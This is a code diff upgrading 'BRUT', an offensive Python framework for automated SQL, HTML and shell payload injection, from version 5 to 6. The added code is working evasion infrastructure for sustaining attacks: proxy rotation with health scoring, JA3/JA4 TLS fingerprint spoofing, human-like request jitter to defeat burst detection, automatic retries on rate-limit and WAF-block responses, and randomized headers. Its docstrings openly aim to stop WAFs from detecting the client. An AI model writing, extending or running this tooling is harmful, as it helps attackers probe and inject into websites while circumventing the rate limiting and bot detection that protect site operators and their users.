@@ -1,18 +1,16 @@
 #!/usr/bin/env python3
 """
-BRUT v5.0 - Ultimate Genetic ML Payload Injection Framework
+BRUT v6.0 — Genetic ML Payload Injection + Anti-Rate-Limit Framework
 ====================================================================
-ALL v4.0 features preserved + NEW:
-- State-Action-Reward Schema (strict feedback loop)
-- Genetic Algorithm Engine (crossover, mutation, selection, generations)
-- Grammar-Based Generation (SQL/HTML/Shell syntax validation)
-- Negative Selection Reinforcement (blacklist failed mutations)
-- WAF Bypass Engine (HPP, smuggling, fragmentation)
-- Context-Aware Polyglot Generator
-- Adaptive Encoding Rotation (dynamic layered encoding)
-- AST-Based Mutation & Crossover
-- Mutation Directive System
-- Anomaly Scoring
+ALL v5.0 features preserved + NEW:
+- Proxy Pool Manager with Automatic Circuit Breaker
+- TLS Fingerprint Spoofing (JA3/JA4 Evasion via curl_cffi)
+- Adaptive Throttling & Jitter (Human-Like Delay)
+- Tenacity Retry Engine (smart retry on 429/403/timeout)
+- IP Health Scoring & Blacklisting
+- Request Pacing with Exponential Backoff
+- Connection Pool Rotation
+- Anti-Detection Header Randomization
 """
 
 import os
@@ -29,6 +27,7 @@ import subprocess
 import warnings
 import itertools
 import traceback
+import threading
 from datetime import datetime
 from urllib.parse import (
     urlparse, urljoin, parse_qs, urlencode,
@@ -68,7 +67,7 @@ STATUS_MEANINGS = {
     414: "URI Too Long",
     415: "Unsupported Media Type",
     422: "Unprocessable Entity",
-    429: "Too Many Requests (Rate Limited)",
+    429: "Too Many Requests (Rate Limited!)",
     431: "Request Headers Too Large",
     451: "Unavailable For Legal Reasons",
     500: "Internal Server Error (Possible Injection!)",
@@ -87,7 +86,7 @@ def get_status_meaning(code: int) -> str:
 
 
 # ============================================================
-# DEPENDENCY MANAGEMENT
+# DEPENDENCY MANAGEMENT (v6.0 — added curl_cffi, tenacity)
 # ============================================================
 REQUIRED_DEPS = [
     ("numpy", "numpy", "Numerical computing", False),
@@ -102,13 +101,15 @@ REQUIRED_DEPS = [
     ("selectolax", "selectolax", "Fast HTML parser", True),
     ("playwright", "playwright", "Headless browser", True),
     ("tldextract", "tldextract", "Domain extraction", False),
-    ("fake_useragent", "fake-useragent", "UA rotation", True),
+    ("fake_useragent", "fake-useragent", "UA rotation", False),
+    ("curl_cffi", "curl_cffi", "TLS fingerprint spoofing (JA3/JA4)", False),
+    ("tenacity", "tenacity", "Smart retry engine", False),
 ]
 
 
 def install_dependencies():
     print("\n\033[36m" + "=" * 60)
-    print("  BRUT v5.0: Dependency Manager")
+    print("  BRUT v6.0: Dependency Manager")
     print("=" * 60 + "\033[0m\n")
 
     missing = []
@@ -243,9 +244,27 @@ except ImportError:
     HAS_FAKE_UA = False
     UA_ROTATOR = None
 
+# v6.0 NEW: curl_cffi for TLS fingerprint spoofing
+try:
+    from curl_cffi import requests as curl_requests
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+
+# v6.0 NEW: tenacity for smart retry
+try:
+    from tenacity import (
+        retry, stop_after_attempt, wait_exponential,
+        wait_random, retry_if_result, retry_if_exception_type,
+        before_sleep_log, RetryCallState
+    )
+    HAS_TENACITY = True
+except ImportError:
+    HAS_TENACITY = False
+
 
 # ============================================================
-# BANNER
+# BANNER v6.0
 # ============================================================
 def print_banner():
     banner = f"""
@@ -256,7 +275,7 @@ def print_banner():
 /_____/_/   \\__,_/\\__/\\___/_/   /_____/
 \033[0m                                       
 \033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
-\033[1;37m      BRUT v5.0 — Genetic ML Payload Evolution Framework\033[0m
+\033[1;37m      BRUT v6.0 — Anti-Rate-Limit Genetic ML Framework\033[0m
 \033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
 
 \033[36m    ┌─────────────────────────────────────────────────────────────┐\033[0m
@@ -277,18 +296,648 @@ def print_banner():
 \033[36m    │\033[0m  \033[32m●\033[0m Stealth Injection    (httpx HTTP/2 + Playwright)       \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Detailed Logger      (payload+snippet+status+time)     \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save     (TXT + JSON + Evolution Log)      \033[36m│\033[0m
+\033[36m    ├─────────────────────────────────────────────────────────────┤\033[0m
+\033[36m    │\033[0m  \033[1;35m★ v6.0 ANTI-RATE-LIMIT ENGINE\033[0m                             \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Proxy Pool Manager   (circuit breaker+health scoring)  \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m TLS Fingerprint      (JA3/JA4 evasion via curl_cffi)   \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Adaptive Throttling  (human-like jitter+backoff)       \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Tenacity Retry       (smart retry on 429/403/timeout)  \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m IP Health Scoring    (blacklist bad proxies auto)      \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Connection Rotation  (pool cycling+cooldown)           \033[36m│\033[0m
 \033[36m    └─────────────────────────────────────────────────────────────┘\033[0m
 
 \033[1;35m    Mode    :\033[0m Interactive  |  \033[1;35mSpecial:\033[0m /exit, max
 \033[1;35m    Length  :\033[0m short, long, super-long, ultra-long
 \033[1;35m    ML      :\033[0m Genetic + Reinforcement Learning
+\033[1;35m    Stealth :\033[0m TLS Spoof + Proxy Rotation + Adaptive Throttle
 \033[1;35m    Date    :\033[0m {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
     print(banner)
 
 
 # ============================================================
-# STEALTH HTTP CLIENT
+# PROXY POOL MANAGER (v6.0 NEW — Circuit Breaker + Health)
+# ============================================================
+@dataclass
+class ProxyInfo:
+    url: str
+    protocol: str = "http"       # http, https, socks4, socks5
+    health_score: float = 1.0    # 0.0 (dead) to 1.0 (healthy)
+    failure_count: int = 0
+    success_count: int = 0
+    last_used: float = 0.0
+    last_failure: float = 0.0
+    cooldown_until: float = 0.0
+    is_blacklisted: bool = False
+    response_times: List[float] = field(default_factory=list)
+    blocked_statuses: List[int] = field(default_factory=list)
+
+    def avg_response_time(self) -> float:
+        if not self.response_times:
+            return 999.0
+        return sum(self.response_times[-20:]) / len(self.response_times[-20:])
+
+
+class ProxyPoolManager:
+    """
+    Manages proxy pool with automatic circuit breaker.
+    - Rotates proxies on 429/403/timeout
+    - Blacklists dead proxies automatically
+    - Health scoring based on success/failure ratio
+    - Cooldown period before retrying failed proxies
+    """
+
+    # Default free/public proxy templates (user should supply their own)
+    DEFAULT_PROXIES = []
+
+    def __init__(self, proxy_list: List[str] = None, cooldown_seconds: float = 30.0,
+                 max_failures: int = 5, blacklist_threshold: float = 0.2):
+        self.proxies: Dict[str, ProxyInfo] = {}
+        self.cooldown_seconds = cooldown_seconds
+        self.max_failures = max_failures
+        self.blacklist_threshold = blacklist_threshold
+        self.current_index = 0
+        self.direct_mode = False  # True = no proxy, direct connection
+        self.lock = threading.Lock()
+        self.rotation_count = 0
+        self.total_rotations = 0
+
+        # Initialize proxies
+        if proxy_list:
+            for p in proxy_list:
+                self.add_proxy(p)
+        else:
+            # Start in direct mode (no proxy)
+            self.direct_mode = True
+            self._add_direct()
+
+    def _add_direct(self):
+        """Add direct connection as a 'proxy' entry."""
+        self.proxies["DIRECT"] = ProxyInfo(
+            url="DIRECT", protocol="direct",
+            health_score=1.0
+        )
+
+    def add_proxy(self, proxy_url: str):
+        """Add a proxy to the pool."""
+        clean = proxy_url.strip()
+        if not clean:
+            return
+        # Detect protocol
+        if clean.startswith("socks5"):
+            proto = "socks5"
+        elif clean.startswith("socks4"):
+            proto = "socks4"
+        elif clean.startswith("https"):
+            proto = "https"
+        else:
+            proto = "http"
+
+        self.proxies[clean] = ProxyInfo(
+            url=clean, protocol=proto, health_score=1.0
+        )
+        self.direct_mode = False
+
+    def load_proxies_from_file(self, filepath: str):
+        """Load proxies from a text file (one per line)."""
+        if not os.path.exists(filepath):
+            print(f"  \033[33m[!]\033[0m Proxy file not found: {filepath}")
+            return 0
+        count = 0
+        with open(filepath, "r") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    self.add_proxy(line)
+                    count += 1
+        if count > 0:
+            self.direct_mode = False
+        print(f"  \033[32m[+]\033[0m Loaded {count} proxies from {filepath}")
+        return count
+
+    def get_next_proxy(self) -> Optional[ProxyInfo]:
+        """
+        Get the next healthy proxy using round-robin with health check.
+        Returns None if all proxies are unhealthy (falls back to direct).
+        """
+        with self.lock:
+            now = time.time()
+            available = []
+
+            for key, proxy in self.proxies.items():
+                if proxy.is_blacklisted:
+                    continue
+                if proxy.cooldown_until > now:
+                    continue
+                if proxy.health_score < self.blacklist_threshold:
+                    proxy.is_blacklisted = True
+                    continue
+                available.append(proxy)
+
+            if not available:
+                # All proxies failed — reset cooldowns and try again
+                self._reset_all_cooldowns()
+                available = [p for p in self.proxies.values()
+                           if not p.is_blacklisted]
+
+            if not available:
+                # Everything blacklisted — force direct mode
+                if "DIRECT" not in self.proxies:
+                    self._add_direct()
+                return self.proxies["DIRECT"]
+
+            # Pick best by health score (weighted random)
+            weights = [max(0.1, p.health_score) for p in available]
+            total_w = sum(weights)
+            r = random.uniform(0, total_w)
+            cumulative = 0
+            chosen = available[0]
+            for i, w in enumerate(weights):
+                cumulative += w
+                if r <= cumulative:
+                    chosen = available[i]
+                    break
+
+            chosen.last_used = now
+            self.total_rotations += 1
+            return chosen
+
+    def get_proxy_dict(self, proxy: ProxyInfo = None) -> Optional[Dict]:
+        """Convert ProxyInfo to requests-compatible proxy dict."""
+        if proxy is None:
+            proxy = self.get_next_proxy()
+        if proxy is None or proxy.url == "DIRECT":
+            return None
+        return {
+            "http": proxy.url,
+            "https": proxy.url,
+        }
+
+    def record_success(self, proxy: ProxyInfo, response_time: float = 0):
+        """Record a successful request through this proxy."""
+        with self.lock:
+            proxy.success_count += 1
+            total = proxy.success_count + proxy.failure_count
+            proxy.health_score = min(1.0, proxy.success_count / max(1, total))
+            if response_time > 0:
+                proxy.response_times.append(response_time)
+                # Keep only last 50
+                if len(proxy.response_times) > 50:
+                    proxy.response_times = proxy.response_times[-50:]
+
+    def record_failure(self, proxy: ProxyInfo, status_code: int = 0):
+        """
+        Record a failed request. Triggers circuit breaker if threshold reached.
+        """
+        with self.lock:
+            proxy.failure_count += 1
+            proxy.last_failure = time.time()
+            total = proxy.success_count + proxy.failure_count
+            proxy.health_score = max(0.0, proxy.success_count / max(1, total))
+
+            if status_code > 0:
+                proxy.blocked_statuses.append(status_code)
+
+            # Circuit breaker: too many failures
+            if proxy.failure_count >= self.max_failures:
+                if proxy.health_score < self.blacklist_threshold:
+                    proxy.is_blacklisted = True
+                    print(f"  \033[31m[CIRCUIT BREAKER]\033[0m Proxy blacklisted: "
+                          f"{proxy.url[:40]}... (health={proxy.health_score:.2f})")
+                else:
+                    # Cooldown instead of blacklist
+                    proxy.cooldown_until = time.time() + self.cooldown_seconds
+                    print(f"  \033[33m[COOLDOWN]\033[0m Proxy cooling down: "
+                          f"{proxy.url[:40]}... ({self.cooldown_seconds}s)")
+
+    def record_rate_limited(self, proxy: ProxyInfo):
+        """Special handling for 429 — immediate rotation."""
+        with self.lock:
+            proxy.failure_count += 2  # Heavier penalty
+            proxy.last_failure = time.time()
+            proxy.cooldown_until = time.time() + (self.cooldown_seconds * 2)
+            total = proxy.success_count + proxy.failure_count
+            proxy.health_score = max(0.0, proxy.success_count / max(1, total))
+            print(f"  \033[1;33m[429 RATE LIMITED]\033[0m Proxy rotated: "
+                  f"{proxy.url[:40]}... → cooldown {self.cooldown_seconds*2:.0f}s")
+
+    def _reset_all_cooldowns(self):
+        """Reset all cooldowns (emergency reset when all proxies are down)."""
+        now = time.time()
+        for proxy in self.proxies.values():
+            proxy.cooldown_until = 0
+            # Partially restore health
+            proxy.health_score = max(proxy.health_score, 0.3)
+
+    def get_pool_stats(self) -> Dict:
+        """Get proxy pool statistics."""
+        total = len(self.proxies)
+        healthy = sum(1 for p in self.proxies.values()
+                     if not p.is_blacklisted and p.health_score > 0.3)
+        blacklisted = sum(1 for p in self.proxies.values() if p.is_blacklisted)
+        on_cooldown = sum(1 for p in self.proxies.values()
+                         if p.cooldown_until > time.time())
+        avg_health = (sum(p.health_score for p in self.proxies.values()) /
+                     max(1, total))
+        return {
+            "total": total,
+            "healthy": healthy,
+            "blacklisted": blacklisted,
+            "on_cooldown": on_cooldown,
+            "avg_health": avg_health,
+            "total_rotations": self.total_rotations,
+            "direct_mode": self.direct_mode,
+        }
+
+    def print_pool_status(self):
+        stats = self.get_pool_stats()
+        mode = "DIRECT" if stats["direct_mode"] else "PROXY"
+        print(f"\n  \033[1;36m[PROXY POOL]\033[0m Mode: {mode}")
+        print(f"    Total: {stats['total']} | Healthy: {stats['healthy']} | "
+              f"Blacklisted: {stats['blacklisted']} | Cooldown: {stats['on_cooldown']}")
+        print(f"    Avg Health: {stats['avg_health']:.2f} | "
+              f"Total Rotations: {stats['total_rotations']}")
+
+
+# ============================================================
+# TLS FINGERPRINT ENGINE (v6.0 NEW — JA3/JA4 Evasion)
+# ============================================================
+class TLSFingerprintEngine:
+    """
+    Uses curl_cffi to spoof TLS fingerprints (JA3/JA4) of real browsers.
+    This prevents WAF from detecting the client as a bot based on TLS handshake.
+
+    Supported impersonation targets:
+    - chrome (latest Chrome)
+    - firefox (latest Firefox)
+    - safari (latest Safari)
+    - edge (latest Edge)
+    """
+
+    IMPERSONATION_TARGETS = [
+        "chrome120", "chrome119", "chrome116", "chrome110",
+        "chrome107", "chrome104", "chrome101", "chrome99",
+        "firefox120", "firefox117", "firefox110", "firefox102",
+        "safari17_0", "safari16_0", "safari15_5",
+        "edge101", "edge99",
+    ]
+
+    def __init__(self):
+        self.current_target = "chrome120"
+        self.rotation_index = 0
+        self.request_count = 0
+        self.rotation_interval = 10  # Rotate TLS fingerprint every N requests
+
+    def get_session(self, proxy_dict: Dict = None) -> Any:
+        """
+        Create a curl_cffi session with browser impersonation.
+        Returns a curl_cffi.requests.Session object.
+        """
+        if not HAS_CURL_CFFI:
+            return None
+
+        self.request_count += 1
+        if self.request_count % self.rotation_interval == 0:
+            self._rotate_target()
+
+        try:
+            proxies = None
+            if proxy_dict:
+                # curl_cffi expects proxy as string
+                for v in proxy_dict.values():
+                    proxies = {"https": v, "http": v}
+                    break
+
+            session = curl_requests.Session(
+                impersonate=self.current_target,
+                proxies=proxies,
+                timeout=30,
+                verify=False,
+            )
+            return session
+        except Exception as e:
+            # Fallback to a simpler target
+            try:
+                session = curl_requests.Session(
+                    impersonate="chrome110",
+                    timeout=30,
+                    verify=False,
+                )
+                return session
+            except:
+                return None
+
+    def _rotate_target(self):
+        """Rotate to next TLS fingerprint target."""
+        self.rotation_index = (self.rotation_index + 1) % len(self.IMPERSONATION_TARGETS)
+        self.current_target = self.IMPERSONATION_TARGETS[self.rotation_index]
+
+    def make_request(self, url: str, method: str = "GET",
+                    params: Dict = None, data: Dict = None,
+                    headers: Dict = None, proxy_dict: Dict = None,
+                    timeout: float = 30.0) -> Tuple[Optional[str], int, float, int]:
+        """
+        Make HTTP request with TLS fingerprint spoofing.
+        Returns: (response_text, status_code, response_time_ms, response_size)
+        """
+        if not HAS_CURL_CFFI:
+            return None, 0, 0, 0
+
+        session = self.get_session(proxy_dict)
+        if session is None:
+            return None, 0, 0, 0
+
+        start = time.time()
+        try:
+            if method == "GET":
+                resp = session.get(url, params=params, headers=headers, timeout=timeout)
+            else:
+                resp = session.post(url, data=data, headers=headers, timeout=timeout)
+
+            elapsed = (time.time() - start) * 1000
+            return resp.text, resp.status_code, elapsed, len(resp.content)
+
+        except Exception as e:
+            elapsed = (time.time() - start) * 1000
+            return None, 0, elapsed, 0
+        finally:
+            try:
+                session.close()
+            except:
+                pass
+
+    def get_current_fingerprint(self) -> str:
+        return self.current_target
+
+    def get_available_targets(self) -> List[str]:
+        return self.IMPERSONATION_TARGETS.copy()
+
+
+# ============================================================
+# ADAPTIVE THROTTLER (v6.0 NEW — Human-Like Delay + Backoff)
+# ============================================================
+class AdaptiveThrottler:
+    """
+    Implements human-like request pacing:
+    - Randomized jitter between requests
+    - Exponential backoff on 429/403
+    - Adaptive speed based on server responses
+    - Burst detection prevention
+    """
+
+    def __init__(self, min_delay: float = 0.3, max_delay: float = 2.5,
+                 burst_limit: int = 15, burst_window: float = 10.0):
+        self.min_delay = min_delay
+        self.max_delay = max_delay
+        self.current_delay = min_delay
+        self.burst_limit = burst_limit
+        self.burst_window = burst_window
+        self.request_timestamps: List[float] = []
+        self.consecutive_429 = 0
+        self.consecutive_success = 0
+        self.total_throttle_time = 0.0
+        self.backoff_multiplier = 1.0
+        self.max_backoff = 30.0  # Maximum backoff in seconds
+        self.is_backing_off = False
+
+    def wait(self):
+        """
+        Wait before sending next request. Applies jitter and backoff.
+        """
+        now = time.time()
+
+        # Burst detection: if too many requests in window, force delay
+        recent = [t for t in self.request_timestamps
+                 if now - t < self.burst_window]
+        if len(recent) >= self.burst_limit:
+            force_delay = self.burst_window - (now - recent[0]) + random.uniform(0.5, 1.5)
+            if force_delay > 0:
+                print(f"  \033[33m[BURST LIMIT]\033[0m Pausing {force_delay:.1f}s "
+                      f"({len(recent)} requests in {self.burst_window:.0f}s window)")
+                time.sleep(force_delay)
+                self.total_throttle_time += force_delay
+
+        # Calculate delay with jitter
+        if self.is_backing_off:
+            delay = self.current_delay * self.backoff_multiplier
+            # Add random jitter (±30%)
+            jitter = delay * random.uniform(-0.3, 0.3)
+            delay = max(self.min_delay, delay + jitter)
+        else:
+            # Normal human-like jitter
+            delay = random.uniform(self.min_delay, self.max_delay)
+            # Occasionally add longer pauses (like human thinking)
+            if random.random() < 0.1:
+                delay += random.uniform(1.0, 4.0)
+
+        # Cap at max backoff
+        delay = min(delay, self.max_backoff)
+
+        time.sleep(delay)
+        self.total_throttle_time += delay
+        self.request_timestamps.append(time.time())
+
+        # Clean old timestamps
+        cutoff = time.time() - 60
+        self.request_timestamps = [t for t in self.request_timestamps if t > cutoff]
+
+    def record_success(self):
+        """Record a successful (non-rate-limited) response."""
+        self.consecutive_success += 1
+        self.consecutive_429 = 0
+
+        # Gradually reduce delay if many successes
+        if self.consecutive_success > 10:
+            self.current_delay = max(self.min_delay, self.current_delay * 0.95)
+            self.backoff_multiplier = max(1.0, self.backoff_multiplier * 0.9)
+
+        # Exit backoff mode after enough successes
+        if self.consecutive_success > 5 and self.is_backing_off:
+            self.is_backing_off = False
+            self.backoff_multiplier = 1.0
+            print(f"  \033[32m[THROTTLE]\033[0m Backoff cleared, resuming normal pace")
+
+    def record_rate_limited(self, status_code: int = 429):
+        """Record a rate-limited response. Triggers exponential backoff."""
+        self.consecutive_429 += 1
+        self.consecutive_success = 0
+        self.is_backing_off = True
+
+        # Exponential backoff: 2^consecutive_429 seconds
+        self.backoff_multiplier = min(
+            self.max_backoff,
+            2.0 ** self.consecutive_429
+        )
+        self.current_delay = min(self.max_delay * 2, self.current_delay * 1.5)
+
+        backoff_time = self.backoff_multiplier
+        print(f"  \033[1;31m[THROTTLE]\033[0m Rate limited ({status_code})! "
+              f"Backoff: {backoff_time:.1f}s (attempt #{self.consecutive_429})")
+
+        # Extra long sleep for rate limiting
+        actual_sleep = backoff_time + random.uniform(1.0, 3.0)
+        time.sleep(actual_sleep)
+        self.total_throttle_time += actual_sleep
+
+    def record_blocked(self, status_code: int = 403):
+        """Record a blocked response (WAF). Moderate backoff."""
+        self.is_backing_off = True
+        self.backoff_multiplier = min(self.max_backoff,
+                                      self.backoff_multiplier * 1.5)
+        extra = random.uniform(1.0, 3.0)
+        time.sleep(extra)
+        self.total_throttle_time += extra
+
+    def get_stats(self) -> Dict:
+        return {
+            "current_delay": f"{self.current_delay:.2f}s",
+            "backoff_multiplier": f"{self.backoff_multiplier:.1f}x",
+            "is_backing_off": self.is_backing_off,
+            "consecutive_429": self.consecutive_429,
+            "consecutive_success": self.consecutive_success,
+            "total_throttle_time": f"{self.total_throttle_time:.1f}s",
+            "requests_last_60s": len([t for t in self.request_timestamps
+                                      if time.time() - t < 60]),
+        }
+
+    def print_stats(self):
+        stats = self.get_stats()
+        status = "BACKOFF" if stats["is_backing_off"] else "NORMAL"
+        color = "\033[31m" if stats["is_backing_off"] else "\033[32m"
+        print(f"  \033[1;36m[THROTTLE]\033[0m {color}{status}\033[0m | "
+              f"Delay: {stats['current_delay']} | "
+              f"Backoff: {stats['backoff_multiplier']} | "
+              f"429s: {stats['consecutive_429']} | "
+              f"Total wait: {stats['total_throttle_time']} | "
+              f"Rate: {stats['requests_last_60s']}/60s")
+
+
+# ============================================================
+# RETRY ENGINE (v6.0 NEW — Tenacity-Based Smart Retry)
+# ============================================================
+class RetryEngine:
+    """
+    Uses tenacity for smart retry logic:
+    - Exponential backoff with jitter
+    - Retry on specific status codes (429, 403, 500, 502, 503, 504)
+    - Retry on connection errors
+    - Maximum retry attempts per request
+    """
+
+    RETRYABLE_STATUS_CODES = {429, 403, 408, 500, 502, 503, 504, 520, 521, 522, 523}
+    MAX_RETRIES = 4
+    BASE_WAIT = 2     # seconds
+    MAX_WAIT = 30     # seconds
+
+    def __init__(self, throttler: AdaptiveThrottler,
+                 proxy_manager: ProxyPoolManager,
+                 tls_engine: TLSFingerprintEngine):
+        self.throttler = throttler
+        self.proxy_manager = proxy_manager
+        self.tls_engine = tls_engine
+        self.retry_count = 0
+        self.total_retries = 0
+
+    def execute_with_retry(self, request_func, *args, **kwargs):
+        """
+        Execute a request function with automatic retry.
+        request_func should return (text, status_code, time_ms, size).
+        """
+        last_result = (None, 0, 0, 0)
+        current_proxy = None
+
+        for attempt in range(self.MAX_RETRIES + 1):
+            # Get proxy for this attempt
+            current_proxy = self.proxy_manager.get_next_proxy()
+            proxy_dict = self.proxy_manager.get_proxy_dict(current_proxy)
+
+            try:
+                # Throttle before request
+                if attempt > 0:
+                    # Extra delay on retries
+                    retry_delay = min(self.MAX_WAIT,
+                                     self.BASE_WAIT * (2 ** attempt) +
+                                     random.uniform(0.5, 2.0))
+                    print(f"  \033[33m[RETRY]\033[0m Attempt {attempt+1}/{self.MAX_RETRIES+1} "
+                          f"after {retry_delay:.1f}s delay | "
+                          f"Proxy: {current_proxy.url[:30]}...")
+                    time.sleep(retry_delay)
+                    self.total_retries += 1
+                else:
+                    self.throttler.wait()
+
+                # Execute the request
+                kwargs_with_proxy = {**kwargs, "proxy_dict": proxy_dict}
+                result = request_func(*args, **kwargs_with_proxy)
+
+                if result is None:
+                    result = (None, 0, 0, 0)
+
+                text, status, elapsed, size = result
+
+                # Handle rate limiting
+                if status == 429:
+                    self.throttler.record_rate_limited(429)
+                    self.proxy_manager.record_rate_limited(current_proxy)
+                    last_result = result
+                    continue  # Retry
+
+                # Handle WAF block
+                if status == 403:
+                    self.throttler.record_blocked(403)
+                    self.proxy_manager.record_failure(current_proxy, 403)
+                    last_result = result
+                    if attempt < self.MAX_RETRIES:
+                        continue  # Retry with different proxy
+                    break
+
+                # Handle server errors (might be injection success!)
+                if status in [500, 502, 503, 504]:
+                    self.proxy_manager.record_failure(current_proxy, status)
+                    # Don't retry server errors — they might be injection results
+                    self.proxy_manager.record_success(current_proxy, elapsed)
+                    self.throttler.record_success()
+                    return result
+
+                # Handle success
+                if status in range(200, 400):
+                    self.proxy_manager.record_success(current_proxy, elapsed)
+                    self.throttler.record_success()
+                    return result
+
+                # Handle other errors
+                if status == 0:
+                    # Connection failed
+                    self.proxy_manager.record_failure(current_proxy, 0)
+                    last_result = result
+                    if attempt < self.MAX_RETRIES:
+                        continue
+                    break
+
+                # Other status codes
+                self.proxy_manager.record_success(current_proxy, elapsed)
+                self.throttler.record_success()
+                return result
+
+            except Exception as e:
+                self.proxy_manager.record_failure(current_proxy, 0)
+                last_result = (None, 0, 0, 0)
+                if attempt < self.MAX_RETRIES:
+                    continue
+                break
+
+        return last_result
+
+    def get_retry_stats(self) -> Dict:
+        return {
+            "total_retries": self.total_retries,
+            "max_retries_per_request": self.MAX_RETRIES,
+            "retryable_codes": sorted(list(self.RETRYABLE_STATUS_CODES)),
+        }
+
+
+# ============================================================
+# STEALTH HTTP CLIENT (Enhanced v6.0)
 # ============================================================
 STEALTH_HEADERS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -299,61 +948,97 @@ STEALTH_HEADERS = [
 ]
 
 
-def get_stealth_client():
-    if not HAS_HTTPX:
-        return None
-    ua = UA_ROTATOR.random if HAS_FAKE_UA else random.choice(STEALTH_HEADERS)
+def get_stealth_headers() -> Dict[str, str]:
+    """Generate randomized stealth headers for each request."""
+    ua = (UA_ROTATOR.random if HAS_FAKE_UA
+          else random.choice(STEALTH_HEADERS))
+
     headers = {
         "User-Agent": ua,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
+        "Accept": random.choice([
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        ]),
+        "Accept-Language": random.choice([
+            "en-US,en;q=0.9,id;q=0.8",
+            "en-US,en;q=0.9",
+            "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "en-GB,en;q=0.9",
+        ]),
+        "Accept-Encoding": random.choice([
+            "gzip, deflate, br",
+            "gzip, deflate",
+            "gzip, deflate, br, zstd",
+        ]),
+        "Connection": random.choice(["keep-alive", "close"]),
         "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
+        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "same-origin"]),
+        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
         "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
-        "DNT": "1",
+        "Cache-Control": random.choice(["max-age=0", "no-cache"]),
+        "DNT": random.choice(["1", "0"]),
     }
+
+    # Randomly add extra headers to look more human
+    if random.random() < 0.3:
+        headers["Referer"] = random.choice([
+            "https://www.google.com/",
+            "https://www.bing.com/",
+            "https://duckduckgo.com/",
+            "",
+        ])
+    if random.random() < 0.2:
+        headers["Pragma"] = "no-cache"
+    if random.random() < 0.15:
+        headers["Sec-CH-UA-Platform"] = random.choice([
+            '"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"'
+        ])
+
+    return headers
+
+
+def get_stealth_client(proxy_dict: Dict = None):
+    if not HAS_HTTPX:
+        return None
+    headers = get_stealth_headers()
+    proxies = proxy_dict if proxy_dict else None
     if HAS_H2:
         try:
             return httpx.Client(
                 headers=headers, follow_redirects=True, timeout=30.0,
-                verify=False, http2=True,
+                verify=False, http2=True, proxies=proxies,
                 limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
             )
         except (ImportError, Exception):
             pass
     return httpx.Client(
         headers=headers, follow_redirects=True, timeout=30.0,
-        verify=False, http2=False,
+        verify=False, http2=False, proxies=proxies,
         limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
     )
 
 
 # ============================================================
-# ENUMS & CONSTANTS
+# ENUMS & CONSTANTS (preserved from v5.0)
 # ============================================================
 class InjectionContext(Enum):
-    """Konteks di mana parameter dimasukkan."""
-    SQL_STRING = "sql_string"           # 'PARAM' or "PARAM"
-    SQL_NUMERIC = "sql_numeric"         # WHERE id=PARAM
-    SQL_IDENTIFIER = "sql_identifier"   # ORDER BY PARAM
-    HTML_BODY = "html_body"             # <div>PARAM</div>
-    HTML_ATTRIBUTE = "html_attribute"   # <input value="PARAM">
-    HTML_HREF = "html_href"             # <a href="PARAM">
-    HTML_SCRIPT = "html_script"         # <script>var x="PARAM"</script>
-    JS_STRING = "js_string"             # var x='PARAM'
-    URL_PARAM = "url_param"             # ?key=PARAM
-    SHELL_ARG = "shell_arg"             # command PARAM
-    SHELL_STRING = "shell_string"       # command "PARAM"
+    SQL_STRING = "sql_string"
+    SQL_NUMERIC = "sql_numeric"
+    SQL_IDENTIFIER = "sql_identifier"
+    HTML_BODY = "html_body"
+    HTML_ATTRIBUTE = "html_attribute"
+    HTML_HREF = "html_href"
+    HTML_SCRIPT = "html_script"
+    JS_STRING = "js_string"
+    URL_PARAM = "url_param"
+    SHELL_ARG = "shell_arg"
+    SHELL_STRING = "shell_string"
     UNKNOWN = "unknown"
 
 
 class MutationType(Enum):
-    """Tipe mutasi yang bisa diterapkan."""
     CASE_VARIATION = "case_variation"
     COMMENT_INSERTION = "comment_insertion"
     WHITESPACE_PADDING = "whitespace_padding"
@@ -382,11 +1067,10 @@ class MutationType(Enum):
 
 
 # ============================================================
-# STATE-ACTION-REWARD SCHEMA (Strict Feedback Loop)
+# STATE-ACTION-REWARD SCHEMA (preserved from v5.0)
 # ============================================================
 @dataclass
 class EvolutionRecord:
-    """Mencatat setiap payload dan evolusinya secara terstruktur."""
     generation_id: str = ""
     parent_payload_id: str = ""
     generation_number: int = 0
@@ -398,24 +1082,24 @@ class EvolutionRecord:
     feedback_loop: Dict[str, Any] = field(default_factory=dict)
     fitness_score: float = 0.0
     is_alive: bool = True
+    proxy_used: str = ""         # v6.0: track which proxy was used
